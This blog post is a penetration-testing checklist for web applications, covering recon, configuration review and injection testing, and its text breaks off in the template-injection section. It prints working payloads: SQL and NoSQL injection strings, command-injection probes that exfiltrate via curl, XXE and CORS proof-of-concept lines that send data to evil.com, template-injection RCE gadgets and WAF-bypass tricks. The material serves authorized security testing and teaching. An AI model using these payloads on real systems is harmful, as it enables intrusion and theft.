---
title: "The Advanced Web Application Penetration Testing Checklist"
date: "2026-06-17"
tags:
    - web
    - checklist
    - owasp
    - pentesting
    - bug-bounty
    - appsec
thumbnail: "/assets/img/thumbnail/post-web-pentesting-checklist.png"
---

This is a master checklist for conducting modern, advanced web application penetration testing and bug bounty hunting. It combines 500+ test cases drawn from the OWASP Web Security Testing Guide (WSTG), the OWASP Top 10 (2021) and API Top 10 (2023), PortSwigger Web Security Academy research, real-world bug bounty methodology, and hard-won field experience.

It is built to be used two ways:

1. **As a methodology** - work top to bottom on a fresh target: recon → map the attack surface → configuration review → then per-vulnerability deep dives.
2. **As a reference** - jump to any section (every vuln class is self-contained with *what it is*, *where to look*, *how to test*, *payloads/examples*, *tools*, and *remediation*).

> **Legal & ethical notice.** Only test systems you own or are explicitly authorized to test (a signed scope, a bug bounty program's rules, or a lab environment). Unauthorized testing is illegal in most jurisdictions. Stay in scope. Avoid destructive payloads (DoS, mass data deletion) against production unless explicitly permitted. When in doubt, ask the program.

> **A note on tools.** Burp Suite Professional is assumed for most workflows (Repeater, Intruder, Scanner, Collaborator, Extensions). Free/community alternatives (OWASP ZAP, mitmproxy, ffuf, sqlmap, nuclei) are noted where relevant. Wordlists referenced throughout (SecLists, etc.) are linked in the final section.

---

## Part I - Methodology & Setup

### 0. Testing Methodology & Workflow

A repeatable methodology beats ad-hoc poking. Map your work to a phase model so you never skip surface.

**Phase model (non-linear - loop as you learn):**

1. **Scope & rules of engagement** - confirm in-scope domains/IPs, out-of-scope assets, allowed test types (no DoS? no social engineering?), rate limits, and reporting channel.
2. **Reconnaissance** - passive then active. Discover every asset, subdomain, endpoint, parameter, and technology.
3. **Mapping** - spider/crawl the app, enumerate entry points, understand roles, document the request graph and state machine.
4. **Configuration & deployment review** - headers, TLS, methods, exposed files, CORS, cloud storage.
5. **Per-vulnerability testing** - injection, access control, auth, client-side, SSRF, file handling, business logic, etc.
6. **Exploitation & chaining** - escalate impact; combine low-severity bugs into critical chains (e.g., IDOR + host header → ATO).
7. **Reporting** - clear, reproducible, impact-driven writeups with CVSS and remediation.

**Mindset cues that find bugs:**

- **Think like the developer.** Ask "how was this probably built?" Guessable IDs, trusting client-supplied fields, copy-pasted auth checks, an admin path that forgot a role check.
- **Hunt anomalies.** A response that's 200ms slower, a field that appears in one endpoint's JSON but not another's, a parameter that does nothing visible.
- **Run "what-if" experiments.** What if I send this twice in parallel? What if I remove this header? What if I'm a different user? What if the value is negative, zero, huge, an array, an object, or null?
- **Map state machines.** Multi-step flows (checkout, registration, password reset, KYC) are where business logic flaws live - try skipping, repeating, and reordering steps.

**Coverage reference:** OWASP WSTG v4.2 test categories (WSTG-INFO, -CONF, -IDNT, -ATHN, -ATHZ, -SESS, -INPV, -ERRH, -CRYP, -BUSL, -CLNT, -APIT). Use them as a completeness checklist.

### 1. Environment & Tooling Setup

Get the lab right before you test - half of "I couldn't reproduce it" is a proxy/TLS/scope problem.

**Intercepting proxy (Burp Suite / ZAP):**

- Install Burp's CA certificate in the browser/OS trust store so HTTPS interception works without errors.
- Use a dedicated browser profile (or Burp's embedded Chromium) to avoid extension noise.
- **Set target scope** in Burp (Target → Scope) and enable "show only in-scope items" - this keeps Collaborator, logging, and scanning constrained and keeps you legal.
- Configure upstream proxy / SOCKS if the program requires a static source IP (some programs whitelist a VPN egress).

**Browser tooling:**

- Extensions: Wappalyzer (tech fingerprint), Cookie-Editor, FoxyProxy (proxy switching), HackBar, a JSON viewer, and a user-agent switcher.
- Master DevTools: Network tab (filter XHR/Fetch), Sources (set breakpoints, read JS, find source maps), Application tab (cookies, localStorage, sessionStorage, IndexedDB, service workers), Console.

**Essential Burp extensions (BApp Store):**

- **Logger++** - searchable, exportable request log across all tools.
- **Autorize / AuthMatrix / Authz** - automated access-control / authorization testing.
- **Param Miner** - discover hidden headers/parameters; find cache poisoning & request smuggling.
- **Turbo Intruder** - high-speed, scriptable request sending (race conditions, brute force).
- **HTTP Request Smuggler** - automated desync detection.
- **JWT Editor** - sign/tamper JSON Web Tokens.
- **Collaborator Everywhere / Active Scan++ / Backslash Powered Scanner** - augmented OOB and active scanning.
- **Hackvertor** - inline encoding/decoding/encryption tags.
- **Retire.js / Software Vulnerability Scanner** - flag known-vulnerable JS libraries.
- **GAP / .NET Beautifier / JS Link Finder** - endpoint & parameter extraction.

**CLI toolkit (Kali / your box):**

- Recon: `subfinder`, `amass`, `assetfinder`, `dnsx`, `httpx`, `katana`, `gau`, `waybackurls`, `gospider`, `gowitness`.
- Fuzzing: `ffuf`, `feroxbuster`, `gobuster`, `wfuzz`, `arjun`, `x8`, `paramspider`.
- Vuln scanning: `nuclei` (+ templates), `sqlmap`, `dalfox`, `nikto`, `wpscan`, `corsy`, `dotdotpwn`, `commix`, `tplmap`.
- Secrets/JS: `trufflehog`, `gitleaks`, `LinkFinder`, `SecretFinder`, `getJS`.
- Misc: `jwt_tool`, `ysoserial`/`ysoserial.net`, `phpggc`, `oauth`-aware tooling.

**Reference:** OWASP WSTG - Testing Environment & Tools; PortSwigger Web Security Academy.

---

## Part II - Reconnaissance & Information Gathering

The single biggest differentiator between mediocre and great testing is recon depth. Bugs live on the assets nobody else found.

### 2. Passive Reconnaissance & OSINT

Gather intel **without touching the target** (no requests to their infra), so it's safe and stealthy.

- **Certificate Transparency logs** - enumerate subdomains from issued TLS certs.
  - Tools/sources: `crt.sh` (`https://crt.sh/?q=%25.target.com`), `censys.io`, `cert.sh`, Subfinder's CT sources.
- **Search-engine dorking (Google/Bing/DuckDuckGo):**
  - `site:target.com -www` (find subdomains/paths), `site:target.com ext:sql | ext:log | ext:bak | ext:env`, `intitle:"index of"`, `inurl:admin`, `site:target.com filetype:pdf`, `"target.com" "api_key"`.
- **GitHub / GitLab recon** - leaked secrets, internal hostnames, API endpoints, hardcoded creds.
  - Dorks: `"target.com" password`, `org:target language:yaml AWS_SECRET`, search for `.env`, `config.json`, `id_rsa`.
  - Tools: `trufflehog github --org=target`, `gitleaks`, GitHub code search, `gitdorker`.
- **Wayback / archive mining** - historical URLs, dead endpoints, old parameters, removed admin panels.
  - Tools: `waybackurls`, `gau` (getallurls), `gauplus`, `web.archive.org`.
- **Shodan / Censys / FOFA / ZoomEye** - exposed services, ports, banners, default panels, forgotten dev boxes.
  - Shodan dorks: `hostname:target.com`, `ssl:"Target Inc"`, `org:"Target"`, `http.title:"Login"`.
- **Cloud & ASN mapping** - find IP ranges the org owns.
  - Tools: `bgp.he.net`, `asnmap`, `amass intel -org "Target"`.
- **DNS records & history** - `MX`, `TXT` (SPF/DMARC/DKIM, verification tokens), `CNAME` (third-party services → takeover candidates), `NS`.
  - Tools: `dig`, `dnsdumpster.com`, `securitytrails.com` (passive DNS history), `viewdns.info`.
- **Email / employee OSINT** - naming convention for usernames, LinkedIn for tech stack and org structure.
  - Tools: `hunter.io`, `theHarvester`, `linkedin2username`.
- **Breach data** - credentials reused across services (only use within authorized scope/rules).
  - Sources: `haveibeenpwned.com` (domain search), `dehashed.com`.
- **JS / app source on third-party CDNs, npm, Docker Hub** - leaked internal package names, registry tokens.

### 3. Active Reconnaissance & Enumeration

Now you interact with the target. Respect rate limits.

**Subdomain enumeration (combine passive + active):**

```bash
subfinder -d target.com -all -recursive -o subs.txt
amass enum -active -d target.com -o amass.txt
# Brute force with a DNS wordlist
puredns bruteforce subdomains-top1M.txt target.com -r resolvers.txt
# Resolve & probe live hosts
cat subs.txt | dnsx -silent | httpx -title -tech-detect -status-code -o live.txt
```

- **Permutation/alteration scanning** - `altdns`, `dnsgen`, `gotator` to find `dev-api`, `api-staging`, `target-internal`, etc.
- **Virtual host (vhost) discovery** - different sites served on the same IP based on the `Host` header.
  - `ffuf -w vhosts.txt -u http://TARGET_IP -H "Host: FUZZ.target.com" -fs <baseline-size>`

**Content / directory discovery:**

```bash
ffuf -w raft-large-directories.txt -u https://target.com/FUZZ -recursion -mc all -fc 404
feroxbuster -u https://target.com -w directory-list-2.3-medium.txt -x php,asp,aspx,jsp,html,js,json,bak,old,zip,txt
```

- Look for: `/admin`, `/api`, `/.git/`, `/backup/`, `/uploads/`, `/swagger`, `/actuator`, `/console`, `/debug`, `/.env`, `/server-status`, `/phpinfo.php`, `/wp-json/`.
- Use extension lists matched to the detected stack; recurse into discovered dirs.

**Technology fingerprinting:**

- `httpx -tech-detect`, Wappalyzer, `whatweb`, `nuclei -t technologies/`.
- Identify: web server (nginx/Apache/IIS), language/framework (PHP/Laravel, Node/Express, Python/Django/Flask, Ruby/Rails, Java/Spring, .NET), CMS (WordPress/Drupal/Joomla), WAF/CDN (Cloudflare/Akamai/AWS), reverse proxies, load balancers.
- Banner/header tells: `Server`, `X-Powered-By`, `X-AspNet-Version`, `Set-Cookie` names (`PHPSESSID`, `JSESSIONID`, `connect.sid`, `laravel_session`, `csrftoken`), error page styles, default favicons (favicon hash → tech via Shodan).

**WAF detection & fingerprinting:**

- Tools: `wafw00f target.com`, `nuclei -t http/waf/`.
- Knowing the WAF (Cloudflare, Akamai, AWS WAF, Imperva, F5) guides your evasion strategy (encoding, casing, chunking, parameter pollution).

**Port & service scanning (if in scope):**

```bash
nmap -sV -sC -p- --min-rate 2000 -oA full target.com
# Fast triage first
rustscan -a target.com -- -sV
```

- Don't ignore non-80/443 services: management consoles, databases, Redis/Memcached, Elasticsearch, RabbitMQ, dev servers on 3000/8000/8080/8443.

### 4. JavaScript & Client-Side Source Analysis

Modern SPAs leak a huge amount in their JS bundles - endpoints, parameters, API keys, feature flags, role logic.

- **Harvest all JS files:**
  - `katana -u https://target.com -jc -o urls.txt` (crawl + JS), `getJS --url`, `gau | grep '\.js'`.
- **Extract endpoints & paths:**
  - `LinkFinder -i https://target.com/main.js -o cli`, `xnLinkFinder`, Burp's JS Link Finder / GAP extension.
- **Hunt secrets:**
  - `SecretFinder -i main.js -o cli`, `trufflehog filesystem ./js/`. Look for API keys (Google, Firebase, AWS, Stripe, Mapbox, Algolia, SendGrid), JWTs, OAuth client secrets, basic-auth strings.
- **Source maps (`.js.map`)** - if present, reconstruct original source (variable names, comments, hidden routes).
  - Check `//# sourceMappingURL=` comments; tools: `sourcemapper`, `unwebpack-sourcemap`.
- **Find hidden/admin functionality** - role checks done client-side (`if (user.isAdmin)`), feature flags, debug params, unused API routes referenced but not linked in the UI.
- **Firebase / cloud config** - check for open Firebase DBs (`https://<proj>.firebaseio.com/.json`), exposed Firestore rules, hardcoded GCP/AWS config.

### 5. Application Entry Points (Attack Surface Mapping)

Spider the app while authenticated as each role, then enumerate every place user input enters the system. These are your injection and logic-flaw targets.

- **Register** - weak password policy, duplicate registration, username/email enumeration, mass-assignment of `role`/`isAdmin` in the signup body, registration over HTTP, disposable-email acceptance, overwriting an existing user by tampering the request.
- **Login** - auth bypass (SQLi/NoSQLi), brute force, user enumeration via differential responses/timing, concurrent sessions, "remember me" token weakness.
- **Upload functionality** - profile pics, attachments, imports, document generators - test for malicious file execution, path control, and SSRF via remote-fetch uploads. (See §55.)
- **Search box** - reflected XSS, SQLi, SSTI, and search-based IDOR (searching others' data).
- **Comment / feedback / reviews** - stored/blind XSS, CSRF, content injection. (Great for blind XSS.)
- **Contact-us forms** - email header injection, blind XSS into admin panels, no rate limit/CAPTCHA → spam/DoS.
- **GET & POST parameters** - every query string, body field, JSON key, and path segment is a tamper target (IDOR, injection, redirect, mass assignment).
- **Cookies, headers, and hidden fields** - session fixation, insecure flags, `X-Forwarded-For` / `X-Forwarded-Host` trust, hidden form fields carrying prices/roles.
- **Import/export & file-processing features** - CSV/Excel/XML/PDF generators (formula injection, XXE, SSRF).
- **WebSockets, GraphQL endpoints, and internal APIs** - often less protected than the main REST API.
- **Multi-step flows** - checkout, KYC, onboarding, password reset, 2FA enrollment - map the state machine for logic flaws.

**Tools:** Burp's site map + target analyzer, `katana`/`gospider` crawl, Param Miner & `arjun` for hidden params.

**Reference:** OWASP WSTG-INFO-06 (Identify Application Entry Points), WSTG-INFO-07/08/09/10.

---

## Part III - Configuration & Deployment Review

Low-effort, high-coverage checks. Run these early; they seed later attacks (a missing `SameSite` enables CSRF; a permissive CORS policy enables data theft; an exposed `.git` hands you source).

### 6. Security Headers

Inspect response headers on the main app and on sensitive endpoints. Missing/weak headers are rarely standalone criticals but are strong building blocks and easy wins.

| Header | What it does | Test for |
| --- | --- | --- |
| `Content-Security-Policy` | Restricts script/resource origins | Missing, `unsafe-inline`/`unsafe-eval`, wildcards, exploitable CDNs, JSONP endpoints (see §31) |
| `X-Frame-Options` / CSP `frame-ancestors` | Anti-framing | Missing → clickjacking (see §11) |
| `Strict-Transport-Security` (HSTS) | Force HTTPS | Missing, short `max-age`, no `includeSubDomains` |
| `X-Content-Type-Options: nosniff` | Stops MIME sniffing | Missing → content-type confusion, XSS via uploaded files |
| `Referrer-Policy` | Controls `Referer` leakage | Permissive → token/PII leak in `Referer` |
| `Set-Cookie` flags | Cookie security | Missing `HttpOnly`, `Secure`, `SameSite`; weak scope; no `__Host-`/`__Secure-` prefix |
| `Cache-Control` / `Pragma` | Caching of sensitive data | Sensitive pages cacheable → cache disclosure |
| `Permissions-Policy` | Feature gating | Overly broad (camera/mic/geolocation) |
| `Access-Control-Allow-*` | CORS | See §10 |

- **Approach:** `curl -sI https://target.com`; compare across endpoints (login vs. app vs. API). Use `securityheaders.com`, `nuclei -t http/misconfiguration/`.
- **Remediation:** Set a strict CSP (nonce/hash-based, no `unsafe-inline`), full HSTS preload, `nosniff`, restrictive `Referrer-Policy`, and `HttpOnly; Secure; SameSite=Lax/Strict` cookies.

### 7. TLS / SSL Configuration

- **Test for:** SSLv2/v3, TLS 1.0/1.1 enabled; weak ciphers (RC4, 3DES, EXPORT, NULL); broken renegotiation; missing forward secrecy; expired/self-signed/mismatched certs; known flaws (Heartbleed CVE-2014-0160, POODLE, ROBOT, BEAST, CRIME, BREACH); HSTS absence; mixed content.
- **Tools:** `sslscan`, `testssl.sh`, `nmap --script ssl-enum-ciphers -p 443`, `ssllabs.com/ssltest`.
- **Remediation:** TLS 1.2+ only, modern cipher suites, ECDHE forward secrecy, valid CA-issued certs, OCSP stapling, HSTS preload.

### 8. HTTP Methods & Verb Tampering

- **Enumerate allowed methods:** `curl -X OPTIONS https://target.com -i` (read `Allow`), or `nmap --script http-methods`.
- **Test for:**
  - **Dangerous methods enabled:** `PUT`/`DELETE` (upload/delete files), `TRACE` (Cross-Site Tracing / XST), `PATCH`, `CONNECT`, WebDAV verbs (`PROPFIND`, `MKCOL`).
  - **Verb tampering for access control bypass:** if `POST /admin/delete` is blocked, try `GET`, `HEAD`, `PUT`, or a bogus method like `FOO` - frameworks sometimes route unknown verbs to a permissive default or skip the auth filter.
  - **`HEAD` bypass:** `HEAD` may execute a state-changing `GET` handler while returning no body (and slipping past response-based filters).
  - **Case/method-override headers:** `X-HTTP-Method-Override: DELETE`, `X-HTTP-Method`, `_method=DELETE` body/param.
- **Remediation:** Disable unused methods; apply authorization to all methods uniformly; ignore method-override unless explicitly required.

### 9. Information Disclosure & Exposed Files

Some of the highest-value, lowest-effort findings.

- **Version control exposure:** `/.git/`, `/.svn/`, `/.hg/`, `/.bzr/`.
  - `/.git/config`, `/.git/HEAD`, `/.git/logs/HEAD` confirm it; dump full source with `git-dumper` or `GitTools`. Recovered source → secrets, logic, more endpoints.
- **Backup & temp files:** `index.php.bak`, `.old`, `~`, `.swp`/`.swo` (vim), `config.php.save`, `db.sql`, `backup.zip`, `site.tar.gz`, `.DS_Store` (dirhunt), `Thumbs.db`.
- **Config & secret files:** `.env`, `.env.local`, `config.json`, `appsettings.json`, `web.config`, `wp-config.php`, `application.yml`, `docker-compose.yml`, `Dockerfile`, `.aws/credentials`, `id_rsa`.
- **Source maps:** `*.js.map` → full client source (see §4).
- **Debug & framework endpoints:** Spring Boot Actuator (`/actuator/env`, `/actuator/heapdump`, `/actuator/mappings`), Django debug pages (`DEBUG=True` stack traces), Laravel Ignition/`telescope`, Flask Werkzeug debugger console (`/console` → RCE via PIN), Rails `/rails/info`, `phpinfo()`.
- **API docs & schemas:** `/swagger.json`, `/swagger-ui`, `/openapi.json`, `/api-docs`, `/graphql` introspection, WSDL for SOAP.
- **Verbose errors & stack traces:** SQL errors (DB type/version, table names), unhandled exceptions (file paths, framework versions, internal IPs), debug banners.
- **Metadata leaks:** EXIF GPS/geolocation in uploaded/served images (`exiftool`, `metapicz.com`); author/path data in generated PDFs/DOCX.
- **`robots.txt` / `sitemap.xml` / `security.txt` / `humans.txt`** - often point to hidden paths.
- **Tools:** `ffuf`/`feroxbuster` with config wordlists, `nuclei -t http/exposures/`, `dirsearch`, `gitleaks`, `nuclei -t http/misconfiguration/`.
- **Remediation:** Block dotfiles/VCS dirs at the web server; disable debug in production; strip verbose errors; remove source maps from prod builds; strip EXIF on upload.

### 10. CORS Misconfiguration

Cross-Origin Resource Sharing flaws let a malicious origin read authenticated responses.

- **The critical combo:** `Access-Control-Allow-Origin` reflects an attacker origin **AND** `Access-Control-Allow-Credentials: true`. That lets `evil.com` make credentialed requests and read the response (steal PII, tokens, CSRF tokens).
- **Test cases:**
  - **Origin reflection:** send `Origin: https://evil.com` → server echoes it back in ACAO.
  - **`null` origin trust:** `Origin: null` reflected → exploit from a sandboxed iframe (`<iframe sandbox="allow-scripts" src="data:text/html,...">`).
  - **Weak regex / suffix-prefix matching:** `target.com.evil.com`, `eviltarget.com`, `target.com` substring anywhere → bypass.
  - **Subdomain trust + an XSS on any subdomain** → escalate to read main-app data.
  - **Wildcard `*`** - note `*` can't be combined with credentials, but `*` on an endpoint serving sensitive data via a bearer token is still exploitable.
  - **Pre-flight bypass / non-standard ports / scheme confusion.**
- **PoC:** `fetch('https://api.target.com/me', {credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://evil.com/x?d='+btoa(d)))`.
- **Tools:** `Corsy`, `CORScanner`, Burp (manual `Origin` tampering), `curl -H "Origin: https://evil.com" -I`.
- **Remediation:** Strict allowlist of exact origins; never reflect arbitrary `Origin`; never combine credentials with wildcards; don't trust `null`.

### 11. Clickjacking & UI Redressing

- **What it is:** the target is framed by `evil.com`, made transparent, and overlaid on bait UI so the victim's clicks land on sensitive actions (transfer funds, change email, "delete account", OAuth "allow").
- **Test for:** missing `X-Frame-Options` and missing CSP `frame-ancestors`. Confirm by framing the page: `<iframe src="https://target.com/account" style="opacity:.2"></iframe>` - if it renders, it's frameable.
- **Escalations:** **drag-and-drop / "click-and-drag"** to exfiltrate tokens, and **double-clickjacking** (timing the second click of a double-click onto a just-spawned consent dialog) to defeat naive defenses.
- **Impact gating:** only meaningful if a single (or few) clicks trigger a sensitive, state-changing action. Pure informational pages are usually N/A.
- **Tools:** Burp's clickbandit, manual iframe PoC.
- **Remediation:** `X-Frame-Options: DENY` (or `SAMEORIGIN`) **and** `Content-Security-Policy: frame-ancestors 'none'` (or specific origins).

### 12. Subdomain & Service Takeover

- **What it is:** a DNS record (usually `CNAME`) points to a third-party service (S3, GitHub Pages, Heroku, Azure, Shopify, Fastly, Netlify, Zendesk, etc.) that's no longer claimed - you register it and serve content on the victim's subdomain (→ phishing, cookie theft on parent domain, OAuth redirect abuse).
- **Test for:** dangling `CNAME`s returning provider "no such bucket / no such app / NoSuchBucket / There isn't a GitHub Pages site here" fingerprints.
- **Don't forget:** `NS` takeover (delegated nameserver), `MX` takeover (email), and second-order takeover via dangling JS includes.
- **Tools:** `subjack`, `subzy`, `dnsReaper`, `nuclei -t http/takeovers/`, `can-i-take-over-xyz` fingerprint list.
- **Remediation:** remove dangling DNS records immediately when deprovisioning a service; claim/lock provider resources.

### 13. Cloud Storage & Asset Misconfiguration

- **Public buckets/blobs:** open S3 (`s3.amazonaws.com/<bucket>`, `<bucket>.s3.amazonaws.com`), GCP Storage, Azure Blob containers - list/read/write.
  - Test: `aws s3 ls s3://bucket --no-sign-request`, anonymous `GET`/`PUT`/list; check bucket ACLs and policy.
  - **Writable bucket** → overwrite served JS/assets → stored XSS/supply-chain.
- **Discovery:** `S3Scanner`, `cloud_enum`, permutations of org/app names; check `Server: AmazonS3` headers and asset hostnames.
- **Cloud metadata via SSRF:** see §54 (IMDS).
- **Exposed CI/CD & IaC:** public `.tf` state files, k8s dashboards, exposed Docker registries, `kubelet` APIs.
- **Remediation:** block public access by default; least-privilege bucket policies; no secrets in object metadata.

### 14. Email Security (SPF / DKIM / DMARC) & Spoofing

- **Check records:**
  - `dig TXT target.com` → SPF (`v=spf1 ...`); missing or `~all`/`?all` (soft) weakens anti-spoof.
  - DMARC: `dig TXT _dmarc.target.com` → missing, or `p=none` (monitor only) allows spoofing.
  - DKIM selector presence.
- **Impact:** missing/weak SPF+DMARC → email spoofing (phishing as `support@target.com`), which amplifies password-reset poisoning and social-engineering chains.
- **Tools:** `mxtoolbox.com`, `dmarcian.com`, spoof-test senders (only with authorization/your own inbox).
- **Remediation:** SPF `-all` (hard fail), DKIM signing, DMARC `p=reject` with reporting.

---

## Part IV - Injection Vulnerabilities

Injection happens when untrusted input is interpreted as code/commands by a downstream interpreter (SQL engine, OS shell, template engine, XML parser, LDAP server, etc.). Test **every** input: query/body params, JSON keys, headers, cookies, path segments, file names, and **stored values that get re-rendered later (second-order)**.

### 15. SQL Injection (SQLi)

User input reaches a SQL query unsanitized. Still one of the highest-impact bugs (data theft, auth bypass, sometimes RCE).

**Detection - break the query first:**

- Submit `'`, `"`, `` ` ``, `\`, `)`, `--`, `#`, `/*` and watch for SQL errors, 500s, or changed behavior.
- Arithmetic/logic differentials: `id=2-1` vs `id=1`; `id=1 AND 1=1` (true) vs `id=1 AND 1=2` (false).
- Always test **in numeric, string (single/double quote), and "out of band" contexts**, and in `ORDER BY`, `LIMIT`, column names, and `INSERT`/`UPDATE` values where placeholders may be absent.

**The five techniques:**

1. **Error-based** - coax the DB into leaking data in error messages.
   - MySQL: `' AND extractvalue(1,concat(0x7e,(SELECT @@version)))-- -` ; `updatexml(...)`.
   - MSSQL: `' AND 1=CONVERT(int,(SELECT @@version))-- -`.
   - PostgreSQL: `' AND 1=CAST((SELECT version()) AS int)-- -`.
1. **UNION-based** - append a second result set.
   - Find column count: `' ORDER BY 1-- -` … incrementing until error; or `' UNION SELECT NULL-- -`, `NULL,NULL`, …
   - Find string-compatible columns, then exfiltrate: `' UNION SELECT NULL,username,password FROM users-- -`.
   - Read schema: `information_schema.tables` / `.columns` (MySQL/MSSQL/PgSQL), `all_tables` (Oracle), `sqlite_master` (SQLite).
1. **Boolean-blind** - infer data from true/false response differences.
   - `' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- -` → diff page = correct char. Automate with Intruder/sqlmap.
1. **Time-blind** - infer via conditional delays (no visible diff).
   - MySQL: `' OR IF(1=1,SLEEP(5),0)-- -` ; `' AND SLEEP(5)-- -`
   - MSSQL: `'; IF (1=1) WAITFOR DELAY '0:0:5'-- -`
   - PostgreSQL: `'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -`
   - Oracle: `' AND 1=(SELECT CASE WHEN (1=1) THEN dbms_pipe.receive_message('a',5) ELSE 1 END FROM dual)-- -`
1. **Out-of-band (OAST)** - exfiltrate via DNS/HTTP when no in-band channel exists.
   - MSSQL: `'; exec master..xp_dirtree '//<id>.collab.net/x'-- -`
   - Oracle: `UTL_HTTP.request`, `UTL_INADDR`, XXE-style; MySQL `LOAD_FILE('\\\\<id>.collab.net\\x')` (Windows).

**Auth bypass classics:** `' OR 1=1-- -`, `admin'-- -`, `' OR '1'='1`, `") OR ("1"="1`.

**Advanced / escalation:**

- **Stacked queries** (`; INSERT...`) where the driver allows (MSSQL, PostgreSQL, sometimes PHP/PDO).
- **RCE paths:** MSSQL `xp_cmdshell`; PostgreSQL `COPY ... TO/FROM PROGRAM`, untrusted PL functions; MySQL `INTO OUTFILE` to write a webshell into the webroot; `LOAD_FILE` to read files.
- **Second-order SQLi** - payload stored on registration/profile, executed when later used in a query.
- **WAF bypass:** inline comments `/*!50000UNION*/`, casing `UnIoN`, whitespace alternatives (`/**/`, `%0a`, `%09`, `+`), encoding (URL/double-URL/unicode/hex), `CONCAT`/`CHAR()` to avoid quotes, parameter pollution, `UNION` → `UNION ALL`.

**Common parameters:** `id`, `user`, `uid`, `pid`, `cat`, `category`, `search`, `q`, `order`, `sort`, `filter`, `page`, `name`, `email`.

**Tools:** `sqlmap -u "https://t/p?id=1" --batch --risk=3 --level=5 --dbs` (use `-r req.txt` for full requests, `--tamper` for WAFs), Burp Scanner, manual UNION.

**Remediation:** parameterized queries / prepared statements, ORM with bound params, allowlist input validation, least-privilege DB user, disable dangerous functions/stacked queries, WAF as defense-in-depth only.

### 16. NoSQL Injection

Against MongoDB, CouchDB, etc. Operator injection bypasses auth and extracts data.

- **Operator injection (auth bypass):**
  - JSON: `{"username":"admin","password":{"$ne":null}}` or `{"$gt":""}` → matches without knowing the password.
  - URL-encoded: `username[$ne]=x&password[$ne]=x` (PHP/Express array parsing).
  - `{"username":{"$in":["admin","root"]}}`, `{"$where":"1==1"}`.
- **Boolean-blind extraction:** `{"password":{"$regex":"^a"}}` → iterate the prefix to dump the password char-by-char.
- **Time-based blind:** `{"$where":"sleep(5000)"}` (MongoDB server-side JS), or heavy regex.
- **Operator injection in query strings** also enables JS injection in `$where`/`mapReduce` → potential RCE on misconfigured engines.
- **Where to test:** login, search, filters, any endpoint taking JSON where you can swap a string for an object.
- **Tools:** `NoSQLMap`, Burp (swap value → object), `nosqli`.
- **Remediation:** validate types (reject objects where strings are expected), cast inputs, disable `$where`/server-side JS, use schema validation.

### 17. OS Command Injection & RCE

User input concatenated into a shell command.

- **Separators / chaining:** `;`, `|`, `||`, `&`, `&&`, `` `cmd` ``, `$(cmd)`, newline `%0a`.
- **Quick probes:** `; id`, `| whoami`, `& dir`, `$(sleep 5)`, `` `sleep 5` `` (backticks).
- **Blind (no output) - use time or OOB:**
  - Time: `& ping -c 10 127.0.0.1 &`, `; sleep 10`.
  - OOB: `; nslookup <id>.collab.net`, `| curl http://<id>.collab.net/$(whoami)` → confirm via Collaborator and exfiltrate.
- **Argument injection** - when you control an argument to a known binary (not a full shell): inject extra flags (e.g., `-o`, `--output`, `-d` to `curl`/`tar`/`ffmpeg`/`git`) to read/write files or trigger SSRF/RCE.
- **Filter bypass:** quotes (`w'h'o'a'm'i`), variable tricks (`who$@ami`, `${IFS}` for spaces, `cat$IFS/etc/passwd`), wildcards (`/???/c?t /etc/p?sswd`), concatenation, base64 (`echo <b64>|base64 -d|sh`), backslashes.
- **Common parameters:** `cmd`, `exec`, `command`, `ping`, `host`, `ip`, `domain`, `dns`, `query`, `file`, `path`, `dir`, `download`, `log`, `arg`, `option`.
- **Common locations:** network diagnostics (ping/traceroute/nslookup), file processors (image/PDF conversion → ImageMagick/Ghostscript/ffmpeg CVEs), backup/admin tools, CGI scripts (Shellshock `() { :;};` in `User-Agent`).
- **Tools:** `commix -u "https://t/?p=x"`, Burp + Collaborator, manual.
- **Remediation:** avoid shelling out; use language-native APIs; if unavoidable, pass arguments as an array (no shell), allowlist values, never interpolate user input.

### 18. XML External Entity (XXE) Injection

XML parser resolves attacker-defined external entities → file read, SSRF, sometimes RCE/DoS.

- **Classic file read:**
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <r>&xxe;</r>
  ```
- **SSRF via XXE:** `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">` → hit cloud metadata/internal services.
- **Blind / OOB (out-of-band) via external DTD** (when output isn't reflected):
  ```xml
  <!DOCTYPE r [<!ENTITY % ext SYSTEM "http://evil.com/x.dtd"> %ext;]>
  ```
  `x.dtd` defines a parameter entity that exfiltrates a file's contents to your server (error-based or DNS/HTTP channel).
- **PHP wrapper escalation:** `php://filter/convert.base64-encode/resource=/etc/passwd` to read files that contain XML-breaking chars.
- **XInclude** - when you can't define a DOCTYPE but control part of an XML doc: `<x xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></x>`.
- **XXE in "exotic" files:** SVG (uploads, avatars), DOCX/XLSX/PPTX (Office Open XML - unzip, inject into XML parts, rezip), PDF, RSS/Atom, SOAP, SAML responses, `.xml` config imports.
- **DoS:** "billion laughs" / quadratic entity expansion (only with permission).
- **Tools:** Burp Scanner + Collaborator, `XXEinjector`, `oxml_xxe`.
- **Remediation:** disable DTDs/external entities in the parser (e.g., `FEATURE_SECURE_PROCESSING`, `disallow-doctype-decl`); use JSON where possible; don't reflect parser errors.

### 19. Server-Side Template Injection (SSTI)

User input is concatenated into a template that's then evaluated server-side → ranges from info leak to RCE.

- **Detect:** inject `${7*7}`, `{{7*7}}`, `<%= 7*7 %>`, `#{7*7}`, `*{7*7}`, `${{7*7}}` - if `49` (or `7777777`) renders, you have SSTI. To fingerprint the engine, note which probe evaluates, errors, or passes through unchanged — each template engine reacts differently. (PortSwigger also publishes a single *universal SSTI polyglot* that fuses all of these engine delimiters into one fingerprinting string.)
- **Engine-specific RCE payloads:**
  - **Jinja2 (Python/Flask):** `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` or the cycler/lipsum/request gadgets; `{{ cycler.__init__.__globals__.os.popen('id').read() }}`.
  - **Twig (PHP):** `{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}` ; `{{ ['id']|filter('system') }}`.
  - **Freemarker (Java):** `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`.
  - **Velocity (Java):** `#set($e="e")$e.getClass().forName("java.lang.Runtime")...`.
  - **Smarty (PHP):** `{php}system('id');{/php}` (older) or `{Smarty_Internal_Write_File::writeFile(...)}`.
